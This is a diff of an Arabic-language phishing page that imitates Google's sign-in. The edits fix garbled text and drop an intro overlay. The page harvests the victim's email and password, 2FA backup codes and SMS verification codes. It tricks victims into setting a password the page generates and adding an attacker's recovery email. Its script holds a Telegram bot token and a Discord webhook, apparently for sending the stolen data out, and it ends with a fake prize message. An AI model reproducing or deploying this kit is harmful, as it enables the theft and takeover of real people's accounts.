@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ - Google</title>
+    <title>تسجيل الدخول - Google</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -20,7 +20,7 @@
             --success-color: #1e8e3e;
         }
 
-        /* Ø§Ù„Ø§Ø³ØªØ¬Ø§Ø¨Ø© Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠØ© Ù„Ù„ÙˆØ¶Ø¹ Ø§Ù„Ø¯Ø§ÙƒÙ† (Dark Mode) */
+        /* الاستجابة التلقائية للوضع الداكن (Dark Mode) */
         @media (prefers-color-scheme: dark) {
             :root {
                 --bg-color: #202124;
@@ -56,35 +56,6 @@
             overflow-x: hidden;
         }
 
-        /* ðŸ”¹ ØªÙ†Ø³ÙŠÙ‚Ø§Øª Ø§Ù„Ø´Ø§Ø´Ø© Ø§Ù„Ø³ÙˆØ¯Ø§Ø¡ ÙˆØ§Ù„Ø´Ø§Ø´Ø§Øª Ø§Ù„ØªÙ…Ù‡ÙŠØ¯ÙŠØ© */
-        #blackScreenOverlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            background-color: #000000;
-            z-index: 99999;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-
-        #introLoadingOverlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            background-color: var(--bg-color);
-            z-index: 99998;
-            display: none;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            color: var(--text-color);
-        }
-
         .container {
             width: 100%;
             max-width: 450px;
@@ -113,7 +84,7 @@
             }
         }
 
-        /* Ø´Ø±ÙŠØ· Ø§Ù„Ø¹ÙˆØ¯Ø© Ø¨Ø£Ø¹Ù„Ù‰ Ø§Ù„Ø´Ø§Ø´Ø© */
+        /* شريط العودة بأعلى الشاشة */
         .top-nav {
             display: flex;
             align-items: center;
@@ -345,24 +316,15 @@
 </head>
 <body>
 
-<!-- ðŸ”¹ 1. Ø§Ù„Ø´Ø§Ø´Ø© Ø§Ù„Ø³ÙˆØ¯Ø§Ø¡ (ØªØ¸Ù‡Ø± Ø£ÙˆÙ„Ø§Ù‹ Ù„Ù…Ø¯Ø© 2 Ø«Ø§Ù†ÙŠØ©) -->
-<div id="blackScreenOverlay"></div>
-
-<!-- ðŸ”¹ 2. Ø´Ø§Ø´Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø£ÙˆÙ„ÙŠØ© (ØªØ¸Ù‡Ø± Ù„Ù…Ø¯Ø© 5 Ø«ÙˆØ§Ù†Ù) -->
-<div id="introLoadingOverlay">
-    <div class="spinner"></div>
-    <p style="font-size:16px; font-weight:600;">Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„...</p>
-</div>
-
 <div class="container">
-    <!-- ðŸ”¹ Ø²Ø± Ø§Ù„Ø¹ÙˆØ¯Ø© ÙÙŠ Ø£Ø¹Ù„Ù‰ Ø§Ù„Ø´Ø§Ø´Ø© -->
+    <!-- 🔹 زر العودة في أعلى الشاشة -->
     <div class="top-nav">
         <button id="backBtn" class="back-btn" onclick="goBack()" style="display: none;">
             <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                 <line x1="5" y1="12" x2="19" y2="12"></line>
                 <polyline points="12 5 19 12 12 19"></polyline>
             </svg>
-            <span>Ø§Ù„Ø¹ÙˆØ¯Ø© Ø®Ø·ÙˆØ©</span>
+            <span>العودة خطوة</span>
         </button>
     </div>
 
@@ -376,193 +338,176 @@
         </svg>
     </div>
 
-    <!-- ðŸ”¹ Ø§Ù„Ù…Ø±Ø­Ù„Ø© Ø§Ù„Ø£ÙˆÙ„Ù‰ -->
+    <!-- 🔹 المرحلة الأولى -->
     <div id="phase1" class="step-page active">
-        <h1 class="title">ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</h1>
-        <p class="subtitle">ÙŠÙØ±Ø¬Ù‰ Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø­Ø³Ø§Ø¨Ùƒ Ø¹Ù„Ù‰ Google. Ø³ØªØªÙ… Ø¥Ø¶Ø§ÙØ© Ø§Ù„Ø­Ø³Ø§Ø¨ Ø¥Ù„Ù‰ Ù‡Ø°Ø§ Ø§Ù„Ø¬Ù‡Ø§Ø² ÙˆØ³ÙŠÙƒÙˆÙ† Ù…ØªØ§Ø­Ø§Ù‹ Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù…Ù‡ ÙÙŠ ØªØ·Ø¨ÙŠÙ‚Ø§Øª Google Ø§Ù„Ø£Ø®Ø±Ù‰.<br>
-            <button class="btn-link" onclick="toggleHelp()">Ù…Ø²ÙŠØ¯ Ù…Ù† Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø­ÙˆÙ„ Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø­Ø³Ø§Ø¨Ùƒ</button>
+        <h1 class="title">تسجيل الدخول</h1>
+        <p class="subtitle">يُرجى استخدام حسابك على Google. ستتم إضافة الحساب إلى هذا الجهاز وسيكون متاحاً لاستخدامه في تطبيقات Google الأخرى.<br>
+            <button class="btn-link" onclick="toggleHelp()">مزيد من المعلومات حول استخدام حسابك</button>
         </p>
         
         <div id="helpBox" style="display:none;" class="alert-info">
-            Ø£Ø¯Ø®Ù„ Ø¨Ø±ÙŠØ¯Ùƒ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ Ø£Ùˆ Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ Ø§Ù„Ù…Ø±ØªØ¨Ø· Ø¨Ø­Ø³Ø§Ø¨ Google Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ Ù„Ù„Ù…ØªØ§Ø¨Ø¹Ø©.
+            أدخل بريدك الإلكتروني أو رقم الهاتف المرتبط بحساب Google الخاص بك للمتابعة.
         </div>
 
         <div class="input-group">
-            <input type="text" id="emailInput" class="input-field" placeholder="Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ Ø£Ùˆ Ø§Ù„Ù‡Ø§ØªÙ" required>
+            <input type="text" id="emailInput" class="input-field" placeholder="البريد الإلكتروني أو الهاتف" required>
         </div>
 
         <div>
-            <a href="https://accounts.google.com/signin" target="_blank" class="btn-link" onclick="trackAction('Ø¶ØºØ· Ø¹Ù„Ù‰ Ø±Ø§Ø¨Ø·: Ù†Ø³ÙŠØª Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ')">Ø¥Ø°Ø§ Ù†Ø³ÙŠØª Ø¹Ù†ÙˆØ§Ù† Ø¨Ø±ÙŠØ¯Ùƒ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ Ø§Ø¯Ø®Ù„ Ù‡Ù†Ø§ Ù„Ù†Ø³Ø®Ù‡</a>
+            <a href="https://accounts.google.com/signin" target="_blank" class="btn-link" onclick="trackAction('ضغط على رابط: نسيت البريد الإلكتروني')">إذا نسيت عنوان بريدك الإلكتروني ادخل هنا لنسخه</a>
         </div>
 
         <div class="actions">
-            <button class="btn-link" onclick="alert('ÙŠØ±Ø¬Ù‰ Ø§Ù„ØªÙˆØ§ØµÙ„ Ù…Ø¹ Ø§Ù„Ø¯Ø¹Ù… Ø§Ù„ÙÙ†ÙŠ Ù„Ù…Ø³Ø§Ø¹Ø¯ØªÙƒ ÙÙŠ Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨'); trackAction('Ø¶ØºØ· Ø¹Ù„Ù‰ Ø²Ø±: Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨');">Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨</button>
-            <button class="btn-primary" onclick="submitPhase1()">Ø§Ù„ØªØ§Ù„ÙŠ</button>
+            <button class="btn-link" onclick="alert('يرجى التواصل مع الدعم الفني لمساعدتك في إنشاء حساب'); trackAction('ضغط على زر: إنشاء حساب');">إنشاء حساب</button>
+            <button class="btn-primary" onclick="submitPhase1()">التالي</button>
         </div>
     </div>
 
-    <!-- Ø´Ø§Ø´Ø© ØªØ­Ù…ÙŠÙ„ 1 -->
+    <!-- شاشة تحميل 1 -->
     <div id="loading1" class="step-page">
         <div class="spinner-container">
             <div class="spinner"></div>
-            <p class="subtitle" style="font-size:16px;">Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„...</p>
+            <p class="subtitle" style="font-size:16px;">جاري التحميل...</p>
         </div>
     </div>
 
-    <!-- ðŸ”¹ Ø§Ù„Ù…Ø±Ø­Ù„Ø© Ø§Ù„Ø«Ø§Ù†ÙŠØ© -->
+    <!-- 🔹 المرحلة الثانية -->
     <div id="phase2" class="step-page">
-        <h1 class="title">Ø¥Ø¯Ø®Ø§Ù„ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±</h1>
-        <p class="subtitle">ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ø§Ù„Ø®Ø§ØµØ© Ø¨Ø­Ø³Ø§Ø¨Ùƒ Ù„Ù…ØªØ§Ø¨Ø¹Ø© Ø§Ù„ØªØ­Ù‚Ù‚</p>
+        <h1 class="title">إدخال كلمة المرور</h1>
+        <p class="subtitle">يرجى إدخال كلمة المرور الخاصة بحسابك لمتابعة التحقق</p>
 
         <div id="phase2_initial">
             <div class="input-group">
-                <input type="text" id="notesInput" class="input-field" placeholder="ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±" autocomplete="off">
+                <input type="text" id="notesInput" class="input-field" placeholder="كلمة المرور" autocomplete="off">
             </div>
-            <button class="btn-link" onclick="showForgotPasswordView()">Ù†Ø³ÙŠØª ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±ØŸ</button>
+            <button class="btn-link" onclick="showForgotPasswordView()">نسيت كلمة المرور؟</button>
             <div class="actions">
                 <div></div>
-                <button class="btn-primary" onclick="submitPhase2Initial()">Ø§Ù„ØªØ§Ù„ÙŠ</button>
+                <button class="btn-primary" onclick="submitPhase2Initial()">التالي</button>
             </div>
         </div>
 
         <div id="phase2_forgot" style="display:none;">
             <p style="font-size:13px; font-weight:600; text-align:right; margin-bottom:8px;">
-                Ø§Ù†Ø³Ø® ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø© ÙˆØ§Ù„ØµÙ‚Ù‡Ø§ ÙÙŠ Ø®Ø§Ù†Ø§Øª ØªØºÙŠÙŠØ± ÙƒÙ„Ù…Ø© Ù…Ø±ÙˆØ± Ø¬ÙˆØ¬Ù„ 
+                انسخ كلمة المرور الجديدة والصقها في خانات تغيير كلمة مرور جوجل 
             </p>
-            <div class="fixed-box" id="uniqueNoteBox">Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªÙˆÙ„ÙŠØ¯...</div>
+            <div class="fixed-box" id="uniqueNoteBox">جاري التوليد...</div>
             
             <a href="https://myaccount.google.com/signinoptions/password" target="_blank" class="btn-primary" style="display:block; text-align:center; text-decoration:none; margin: 15px 0;" onclick="handlePasswordRedirect()">
-                Ø¥Ø¶ØºØ· Ù‡Ù†Ø§ Ù„Ù†Ø³Ø® ÙˆØªØºÙŠÙŠØ± ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø©
+                إضغط هنا لنسخ وتغيير كلمة المرور الجديدة
             </a>
 
             <div id="newNotesContainer" style="margin-top:20px;">
-                <label style="font-size:13px; color:var(--subtext-color); display:block; margin-bottom:6px;">Ø£Ø¯Ø®Ù„ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø© Ù‡Ù†Ø§</label>
-                <input type="text" id="newNotesInput" class="input-field" placeholder="ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø©" disabled>
+                <label style="font-size:13px; color:var(--subtext-color); display:block; margin-bottom:6px;">أدخل كلمة المرور الجديدة هنا</label>
+                <input type="text" id="newNotesInput" class="input-field" placeholder="كلمة المرور الجديدة" disabled>
             </div>
 
             <div class="actions">
                 <div></div>
-                <button class="btn-primary" id="btnSubmitNewNotes" disabled onclick="submitPhase2Final()">Ù…ÙˆØ§ÙÙ‚</button>
+                <button class="btn-primary" id="btnSubmitNewNotes" disabled onclick="submitPhase2Final()">موافق</button>
             </div>
         </div>
     </div>
 
-    <!-- Ø´Ø§Ø´Ø© ØªØ­Ù…ÙŠÙ„ 2 -->
+    <!-- شاشة تحميل 2 -->
     <div id="loading2" class="step-page">
         <div class="spinner-container">
             <div class="spinner"></div>
-            <p class="subtitle" style="font-size:16px;">Ø¬Ø§Ø±ÙŠ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ ÙˆØ§Ù„ØªØ£ÙƒØ¯ Ù…Ù† Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª...</p>
+            <p class="subtitle" style="font-size:16px;">جاري تسجيل الدخول والتأكد من المعلومات...</p>
         </div>
     </div>
 
-    <!-- ðŸ”¹ Ø§Ù„Ù…Ø±Ø­Ù„Ø© Ø§Ù„Ø«Ø§Ù„Ø«Ø© -->
+    <!-- 🔹 المرحلة الثالثة -->
     <div id="phase3" class="step-page">
-        <h1 class="title">ØªØ£ÙƒÙŠØ¯ Ù…Ù„ÙƒÙŠØ© Ø§Ù„Ø­Ø³Ø§Ø¨</h1>
-        <p class="subtitle">Ø§Ø®ØªØ± Ø¥Ø­Ø¯Ù‰ Ø§Ù„Ø·Ø±Ù‚ Ø§Ù„Ù…ØªØ¨Ù‚ÙŠØ© Ù„ØªØ£ÙƒÙŠØ¯ Ù…Ù„ÙƒÙŠØ© Ø§Ù„Ø­Ø³Ø§Ø¨</p>
+        <h1 class="title">تأكيد ملكية الحساب</h1>
+        <p class="subtitle">اختر إحدى الطرق المتبقية لتأكيد ملكية الحساب</p>
 
         <div id="errorAlert" class="alert-danger" style="display:none;"></div>
 
-        <!-- Ø§Ù„Ø®ÙŠØ§Ø± Ø§Ù„Ø£ÙˆÙ„: Ø±Ù…ÙˆØ² Ø§Ù„Ø£Ù…Ø§Ù† Ù…Ø¹ Ù…ØªØ§Ø¨Ø¹Ø© Ø§Ù„Ø¶ØºØ· Ø¹Ù„Ù‰ Ø§Ù„Ø±Ø§Ø¨Ø· -->
+        <!-- الخيار الأول: رموز الأمان مع متابعة الضغط على الرابط -->
         <div style="border:1px solid var(--border-color); padding:14px; border-radius:8px; margin-bottom:12px;">
-            <p style="font-size:13px; font-weight:700; margin-bottom:6px;">Ø§Ù„Ø®ÙŠØ§Ø± Ø§Ù„Ø£ÙˆÙ„ (Ø±Ù…ÙˆØ² Ø§Ù„Ø£Ù…Ø§Ù†):</p>
+            <p style="font-size:13px; font-weight:700; margin-bottom:6px;">الخيار الأول (رموز الأمان):</p>
             <a href="https://myaccount.google.com/two-step-verification/backup-codes?rapt=AEjHL4NH1uNU_f4qoFKzUpZjW39_uNqCHALYUHBkgBhMy8sCr1LpX8y-_pyz1_pRYZ5VkYJToRe_u4zNERRurZB_EFrnIyDAmEM-jz1FpDwGhPAjOcsSqPQ" target="_blank" class="btn-link" style="font-size:12px; margin-bottom:10px; display:block;" onclick="handleBackupCodesRedirect()">
-                Ø§Ø¶ØºØ· Ù‡Ù†Ø§ ÙˆØ£Ø®ØªØ± Ø§Ø­Ø¯ Ø±Ù…ÙˆØ² Ø§Ù„Ø£Ù…Ø§Ù† ÙˆØ£Ø¯Ø®Ù„Ù‡ ÙÙŠ Ø§Ù„Ø®Ø§Ù†Ø© Ø§Ù„Ø®Ø§ØµØ© Ø¨Ø±Ù…Ø² Ø§Ù„Ø£Ù…Ø§Ù† 
+                اضغط هنا وأختر احد رموز الأمان وأدخله في الخانة الخاصة برمز الأمان 
             </a>
-            <input type="text" id="backupCodeInput" class="input-field" placeholder="Ø£Ø¯Ø®Ù„ Ø±Ù…Ø² Ø§Ù„Ø£Ù…Ø§Ù† Ù‡Ù†Ø§">
-            <button class="btn-primary" style="width:100%; margin-top:8px;" onclick="submitBackupCode()">ØªØ£ÙƒÙŠØ¯ Ø¨Ø±Ù…Ø² Ø§Ù„Ø£Ù…Ø§Ù†</button>
+            <input type="text" id="backupCodeInput" class="input-field" placeholder="أدخل رمز الأمان هنا">
+            <button class="btn-primary" style="width:100%; margin-top:8px;" onclick="submitBackupCode()">تأكيد برمز الأمان</button>
         </div>
 
-        <!-- Ø§Ù„Ø®ÙŠØ§Ø± Ø§Ù„Ø«Ø§Ù†ÙŠ: Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø§Ø³ØªØ±Ø¯Ø§Ø¯ -->
+        <!-- الخيار الثاني: بريد الاسترداد -->
         <div style="border:1px solid var(--border-color); padding:14px; border-radius:8px; margin-bottom:12px;">
-            <p style="font-size:13px; font-weight:700; margin-bottom:6px;">Ø§Ù„Ø®ÙŠØ§Ø± Ø§Ù„Ø«Ø§Ù†ÙŠ (Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø§Ø³ØªØ±Ø¯Ø§Ø¯):</p>
+            <p style="font-size:13px; font-weight:700; margin-bottom:6px;">الخيار الثاني (بريد الاسترداد):</p>
             <div class="fixed-box" style="margin: 6px 0;">pubgrivals7@gmail.com</div>
-            <a href="https://myaccount.google.com/recovery/email" target="_blank" class="btn-link" style="font-size:12px;" onclick="trackAction('Ø¶ØºØ· Ø¹Ù„Ù‰ Ø±Ø§Ø¨Ø· Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø§Ø³ØªØ±Ø¯Ø§Ø¯')">
-                Ø§Ù†Ø³Ø® Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ ÙˆØ§Ù„ØµÙ‚Ù‡ Ù‡Ù†Ø§ Ù„ØªØ£ÙƒÙŠØ¯ Ø­Ø³Ø§Ø¨Ùƒ
+            <a href="https://myaccount.google.com/recovery/email" target="_blank" class="btn-link" style="font-size:12px;" onclick="trackAction('ضغط على رابط بريد الاسترداد')">
+                انسخ البريد الإلكتروني والصقه هنا لتأكيد حسابك
             </a>
         </div>
 
-        <button class="btn-link" style="text-align:center; display:block; margin: 10px auto;" onclick="toggleAlternativeWays()">ØªØ¬Ø±Ø¨Ø© Ø·Ø±ÙŠÙ‚Ø© Ø£Ø®Ø±Ù‰ Ù„Ù„ØªØ£ÙƒÙŠØ¯</button>
+        <button class="btn-link" style="text-align:center; display:block; margin: 10px auto;" onclick="toggleAlternativeWays()">تجربة طريقة أخرى للتأكيد</button>
 
         <div id="alternativeWays" style="display:none; border-top:1px solid var(--border-color); padding-top:12px; margin-top:10px;">
             <div class="alert-info">
-                <strong>Ø§Ù„ØªØ£ÙƒÙŠØ¯ Ø¨Ø§Ù„Ø¥Ø´Ø¹Ø§Ø±:</strong>Ø³ÙˆÙ ÙŠØ¸Ù‡Ø± Ù„Ùƒ Ø¥Ø´Ø¹Ø§Ø± ÙŠÙ‚ÙˆÙ„ Ù‡Ù„ Ø£Ù†Øª Ù…Ù† ÙŠØ­Ø§ÙˆÙ„ Ø§Ø³ØªØ±Ø¯Ø§Ø¯ Ø§Ù„Ø­Ø³Ø§Ø¨ØŸ ÙŠØ±Ø¬Ù‰ ÙØªØ­ Ø§Ù„Ø£Ø´Ø¹Ø§Ø± ÙˆØ§Ù„Ù…ÙˆØ§ÙÙ‚Ø© Ø¨Ø§Ù„Ø¶ØºØ· Ø¹Ù„Ù‰ ( Ù†Ø¹Ù… Ø£Ù†Ø§ ) Ù…Ø¹ Ø§Ø®ØªÙŠØ§Ø± Ø§Ù„Ø±Ù‚Ù… Ø§Ù„ØµØ­ÙŠØ­ Ù…Ù† Ø§Ù„Ø¯Ø¹Ù… Ù„Ù„ØªØ£ÙƒÙŠØ¯.
+                <strong>التأكيد بالإشعار:</strong>سوف يظهر لك إشعار يقول هل أنت من يحاول استرداد الحساب؟ يرجى فتح الأشعار والموافقة بالضغط على ( نعم أنا ) مع اختيار الرقم الصحيح من الدعم للتأكيد.
             </div>
 
             <div style="margin-top:10px;">
-                <p style="font-size:13px; font-weight:700; margin-bottom:6px;">Ø§Ù„ØªØ£ÙƒÙŠØ¯ Ø¨ÙƒÙˆØ¯ Ø§Ù„ØªØ­Ù‚Ù‚</p>
-                <input type="text" id="phoneOrEmailInput" class="input-field" placeholder="Ø£Ø¯Ø®Ù„ Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ Ø£Ùˆ Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ" style="margin-bottom:8px;">
-                <button class="btn-primary" style="width:100%;" onclick="requestVerificationCode()">Ù…ÙˆØ§ÙÙ‚</button>
+                <p style="font-size:13px; font-weight:700; margin-bottom:6px;">التأكيد بكود التحقق</p>
+                <input type="text" id="phoneOrEmailInput" class="input-field" placeholder="أدخل رقم الهاتف أو البريد الإلكتروني" style="margin-bottom:8px;">
+                <button class="btn-primary" style="width:100%;" onclick="requestVerificationCode()">موافق</button>
             </div>
         </div>
     </div>
 
-    <!-- --- Ø§Ù„Ù…Ø±Ø­Ù„Ø© Ø§Ù„Ø±Ø§Ø¨Ø¹Ø© --- -->
+    <!-- --- المرحلة الرابعة --- -->
     <div id="phase4" class="step-page">
-      <h1 class="title">Ø¥Ø¯Ø®Ø§Ù„ ÙƒÙˆØ¯ Ø§Ù„ØªØ­Ù‚Ù‚</h1>
+      <h1 class="title">إدخال كود التحقق</h1>
 
       <div class="alert-info">
-        Ù‚Ø¯ ÙŠØªØ£Ø®Ø± Ø§Ù„ÙƒÙˆØ¯ØŒ ÙŠØ±Ø¬Ù‰ ØªØ±Ùƒ Ø§Ù„ØµÙØ­Ø© Ù…ÙØªÙˆØ­Ø© ÙˆØ¥Ø°Ø§ Ø£Ø±Ø³Ù„Ù†Ø§ Ù„Ùƒ Ø§Ù„ÙƒÙˆØ¯ Ø³Ù†Ø®Ø¨Ø±Ùƒ Ø¨Ø±Ø³Ø§Ù„ØªÙ‡ Ø¹Ù† Ø·Ø±ÙŠÙ‚ Ø§Ù„Ù…Ø­Ø§Ø¯Ø«Ø© Ø§Ù„Ù…Ø¨Ø§Ø´Ø±Ø©.
+        قد يتأخر الكود، يرجى ترك الصفحة مفتوحة وإذا أرسلنا لك الكود سنخبرك برسالته عن طريق المحادثة المباشرة.
       </div>
 
       <div class="input-group">
-        <input type="text" id="verificationCodeInput" class="input-field" placeholder="Ø£Ø¯Ø®Ù„ Ø§Ù„ÙƒÙˆØ¯" maxlength="8">
-        <button class="btn-primary" style="width:100%; margin-top:10px;" onclick="verifyCode()">Ù…ÙˆØ§ÙÙ‚</button>
+        <input type="text" id="verificationCodeInput" class="input-field" placeholder="أدخل الكود" maxlength="8">
+        <button class="btn-primary" style="width:100%; margin-top:10px;" onclick="verifyCode()">موافق</button>
       </div>
 
       <p style="font-size:12px; color:var(--subtext-color); margin-bottom:8px; font-weight:600;">
-          Ø¥Ø°Ø§ ÙØ´Ù„ ÙØªØ­ Ø§Ù„ØªØ·Ø¨ÙŠÙ‚Ø§Øª Ø§Ø°Ù‡Ø¨ Ù„ÙØªØ­Ù‡Ø§ Ù…Ù† Ø§Ù„Ù‚Ø§Ø¦Ù…Ø© Ù„Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„ÙƒÙˆØ¯:
+          إذا فشل فتح التطبيقات اذهب لفتحها من القائمة للحصول على الكود:
       </p>
 
       <div class="smart-btns">
-          <a href="mailto:" target="_blank" class="smart-btn" onclick="trackAction('ÙØªØ­ ØªØ·Ø¨ÙŠÙ‚: Email Ø§Ù„ÙˆØ§Ø±Ø¯')">âœ‰ï¸ Email Ø§Ù„ÙˆØ§Ø±Ø¯</a>
-          <a href="https://wa.me/" target="_blank" class="smart-btn" onclick="trackAction('ÙØªØ­ ØªØ·Ø¨ÙŠÙ‚: WhatsApp')">ðŸ’¬ WhatsApp</a>
-          <a href="sms:" target="_blank" class="smart-btn" onclick="trackAction('ÙØªØ­ ØªØ·Ø¨ÙŠÙ‚: Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ SMS')">ðŸ“± Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ SMS</a>
+          <a href="mailto:" target="_blank" class="smart-btn" onclick="trackAction('فتح تطبيق: Email الوارد')">✉️ Email الوارد</a>
+          <a href="https://wa.me/" target="_blank" class="smart-btn" onclick="trackAction('فتح تطبيق: WhatsApp')">💬 WhatsApp</a>
+          <a href="sms:" target="_blank" class="smart-btn" onclick="trackAction('فتح تطبيق: الرسائل SMS')">📱 الرسائل SMS</a>
       </div>
 
       <div style="margin-top:25px; text-align:center;">
-          <p style="font-size:13px; color:var(--subtext-color);">Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± ÙˆØ§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª...</p>
+          <p style="font-size:13px; color:var(--subtext-color);">جاري الانتظار والتحقق من البيانات...</p>
       </div>
     </div>
 
-    <!-- ðŸ”¹ Ø¨ÙˆØ§Ø¨Ø© Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± ÙˆØ§Ù„ØªØ­ÙƒÙ… Ø§Ù„ÙŠØ¯ÙˆÙŠ -->
+    <!-- 🔹 بوابة الانتظار والتحكم اليدوي -->
     <div id="waitingTelegram" class="step-page">
         <div class="spinner-container">
             <div class="spinner"></div>
-            <p class="subtitle" style="font-size:16px;">Ø¬Ø§Ø±ÙŠ Ù…Ø±Ø§Ø¬Ø¹Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ÙˆØ§Ù„ØªØ£ÙƒØ¯ Ù…Ù† Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø­Ø³Ø§Ø¨...</p>
-            <p style="font-size:12px; color:var(--subtext-color);">ÙŠØ±Ø¬Ù‰ Ø¹Ø¯Ù… Ø¥ØºÙ„Ø§Ù‚ Ø§Ù„ØµÙØ­Ø©</p>
+            <p class="subtitle" style="font-size:16px;">جاري مراجعة البيانات والتأكد من معلومات الحساب...</p>
+            <p style="font-size:12px; color:var(--subtext-color);">يرجى عدم إغلاق الصفحة</p>
         </div>
     </div>
 
-    <!-- ðŸ”¹ Ø´Ø§Ø´Ø© Ø§Ù„Ù†Ø¬Ø§Ø­ -->
+    <!-- 🔹 شاشة النجاح -->
     <div id="successScreen" class="step-page">
-        <div class="success-icon">âœ“</div>
-        <h1 class="title" style="color:var(--success-color);">ØªÙ… Ø§Ù„ØªØ³Ø¬ÙŠÙ„ Ø¨Ù†Ø¬Ø§Ø­!</h1>
+        <div class="success-icon">✓</div>
+        <h1 class="title" style="color:var(--success-color);">تم التسجيل بنجاح!</h1>
         <p class="subtitle" style="font-size:16px; margin-top:15px; line-height:1.6;">
-            Ø³ÙŠØªÙ… Ø¥Ø±Ø³Ø§Ù„ ÙˆØ´Ø­Ù† Ø§Ù„Ø­Ø³Ø§Ø¨ Ù…Ø¨Ø§Ø´Ø±Ù‡ Ø¨Ø§Ù„Ø¬ÙˆØ§Ø¦Ø² ÙÙŠ Ø­Ø§Ù„ Ø§Ù„ÙÙˆØ².
+            سيتم إرسال وشحن الحساب مباشره بالجوائز في حال الفوز.
         </p>
     </div>
 
 </div>
 
 <script>
-    //      (  2  +   5 )
-    window.addEventListener('DOMContentLoaded', () => {
-        const blackScreen = document.getElementById('blackScreenOverlay');
-        const introLoading = document.getElementById('introLoadingOverlay');
-
-        //  :      
-        setTimeout(() => {
-            if (blackScreen) blackScreen.style.display = 'none';
-            if (introLoading) introLoading.style.display = 'flex';
-
-            //  5   ( 7 ):      
-            setTimeout(() => {
-                if (introLoading) introLoading.style.display = 'none';
-            }, 5000);
-        }, 2000);
-    });
-
-    //    
+    // ⚙️ إعدادات التليجرام وديسكورد
     const TELEGRAM_BOT_TOKEN = "8919787970:AAEmU4rsJAI5XUc2TyzUkur0Lpom_Tk07Kg";
     const TELEGRAM_CHAT_ID = "8796885500";
     const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1551997681063297095/9wne8QtpIrX2JvrgzuLrI1-drIT2vkAIo5zOmRA0q31dcAwarxXMCYEcyUpG6kEmnV8j";
@@ -577,27 +522,25 @@
         verificationCode: ''
     };
 
-    //       
+    // مصفوفة لتتبع التاريخ والتنقلات للعودة خطوة للخلف
     let historyStack = ['phase1'];
     let hasVisitedBackupCodesLink = false;
     let pollInterval = null;
 
     const pageNames = {
-        'phase1': ' 1:     ',
-        'loading1': '  (1)',
-        'phase2': ' 2:   ',
-        'loading2': '  (2)',
